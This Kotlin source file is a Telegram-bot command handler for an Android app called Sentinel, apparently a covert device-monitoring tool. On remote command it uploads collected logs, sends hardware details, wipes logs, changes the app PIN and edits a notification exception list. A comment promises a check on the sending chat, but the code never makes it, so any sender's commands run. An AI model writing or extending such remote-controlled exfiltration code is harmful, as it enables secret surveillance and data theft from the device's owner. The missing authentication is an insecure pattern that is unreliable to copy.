package com.zero.sentinel.network

import android.util.Log
import com.google.gson.Gson
import com.google.gson.JsonArray
import com.google.gson.JsonObject
import com.zero.sentinel.data.repository.LogRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class CommandProcessor(
    private val context: android.content.Context,
    private val repository: LogRepository,
    private val client: TelegramClient,
    private val prefs: com.zero.sentinel.data.EncryptedPrefsManager = com.zero.sentinel.data.EncryptedPrefsManager(context)
) {
    private val gson = Gson()
    private val scope = CoroutineScope(Dispatchers.IO)

    fun processUpdates(jsonResponse: String?): Long {
        if (jsonResponse == null) return 0
        
        var maxUpdateId = 0L

        try {
            val root = gson.fromJson(jsonResponse, JsonObject::class.java)
            if (!root.has("result")) return 0
            
            val results = root.getAsJsonArray("result")
            
            for (i in 0 until results.size()) {
                val update = results.get(i).asJsonObject
                val updateId = update.get("update_id").asLong
                if (updateId > maxUpdateId) maxUpdateId = updateId
                
                if (update.has("message")) {
                    val message = update.getAsJsonObject("message")
                    if (message.has("text")) {
                        val text = message.get("text").asString

                        
                        // Security check: Only execute commands from configured chat
                        // (Assuming client/prefs ensures we only talk to right chat, but good to check)
                        
                        handleCommand(text)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("CommandProcessor", "Error processing updates", e)
        }
        
        return maxUpdateId
    }

    private fun handleCommand(command: String) {
        Log.i("CommandProcessor", "Received command: $command")
        
        when {
            command.startsWith("/ping") -> {
                val lastHeartbeat = prefs.getLastHeartbeat()
                val now = System.currentTimeMillis()
                val device = com.zero.sentinel.utils.DeviceInfoHelper.getShortDeviceInfo()
                
                if (lastHeartbeat == 0L) {
                    client.sendMessage("Pong! [$device]\nStatus: Waiting for first heartbeat.")
                } else {
                    val diff = now - lastHeartbeat
                    val diffMin = diff / (60 * 1000)
                    val nextIn = maxOf(0, 15 - diffMin)
                    
                    val formatter = java.text.SimpleDateFormat("HH:mm", java.util.Locale.getDefault())
                    val nextRunTime = formatter.format(java.util.Date(now + (nextIn * 60 * 1000)))
                    
                    client.sendMessage(
                        "Pong! [$device]\n" +
                        "⏱️ Last run: ${diffMin}m ago\n" +
                        "🔄 Next cycle: ~${nextIn}m (at $nextRunTime)"
                    )
                }
            }
            command.startsWith("/hwinfo") -> {
                val info = com.zero.sentinel.utils.DeviceInfoHelper.getHardwareInfo(context)
                client.sendMessage(info)
            }
            command.startsWith("/getlogs") -> {
                scope.launch {
                    val success = com.zero.sentinel.utils.LogUploadHelper.upload(context, repository, client)
                    if (!success) {
                        client.sendMessage("⚠️ No new logs to upload or upload failed.")
                    }
                }
            }
            command.startsWith("/wipe") -> {
                scope.launch {
                    repository.deleteAllLogs()
                    client.sendMessage("Logs wiped locally.")
                }
            }
            command.startsWith("/setpin ") -> {
                val newPin = command.substringAfter("/setpin ").trim()
                if (newPin.isNotEmpty() && newPin.all { it.isDigit() } && newPin.length == 6) {
                    prefs.saveAppPassword(newPin)
                    client.sendMessage("PIN updated to: $newPin")
                } else {
                    client.sendMessage("Invalid PIN. Use 6 digits only.")
                }
            }
            command.startsWith("/exception") -> {
                handleExceptionCommand(command)
            }
            else -> {
                // Ignore unknown
            }
        }
    }

    private fun handleExceptionCommand(command: String) {
        val parts = command.split(" ")
        val action = parts.getOrNull(1)?.lowercase()
        val target = parts.getOrNull(2)

        // val prefs = com.zero.sentinel.data.EncryptedPrefsManager(context) // Removed, using injected 'prefs'
        val currentExceptions = prefs.getNotificationExceptions().toMutableSet()

        when (action) {
            "add" -> {
                if (!target.isNullOrEmpty()) {
                    if (currentExceptions.add(target)) {
                        prefs.saveNotificationExceptions(currentExceptions)
                        client.sendMessage("✅ Added to exceptions: $target")
                    } else {
                        client.sendMessage("⚠️ Already in exceptions: $target")
                    }
                } else {
                    client.sendMessage("Usage: /exception add <package_name>")
                }
            }
            "remove", "delete" -> {
                if (!target.isNullOrEmpty()) {
                    if (currentExceptions.remove(target)) {
                        prefs.saveNotificationExceptions(currentExceptions)
                        client.sendMessage("🗑️ Removed from exceptions: $target")
                    } else {
                        client.sendMessage("⚠️ Not found in exceptions: $target")
                    }
                } else {
                    client.sendMessage("Usage: /exception delete <package_name>")
                }
            }
            "list" -> {
                if (currentExceptions.isEmpty()) {
                    client.sendMessage("Exceptions list is empty.")
                } else {
                    val listStr = currentExceptions.joinToString("\n") { "- $it" }
                    client.sendMessage("🚫 **Notification Exceptions:**\n$listStr")
                }
            }
            "wipe", "clear" -> {
                prefs.saveNotificationExceptions(emptySet())
                client.sendMessage("🔥 Exception list wiped!")
            }
            else -> {
                client.sendMessage(
                    """
                    Usage:
                    /exception add <pkg>
                    /exception delete <pkg>
                    /exception list
                    /exception wipe
                    """.trimIndent()
                )
            }
        }
    }
}
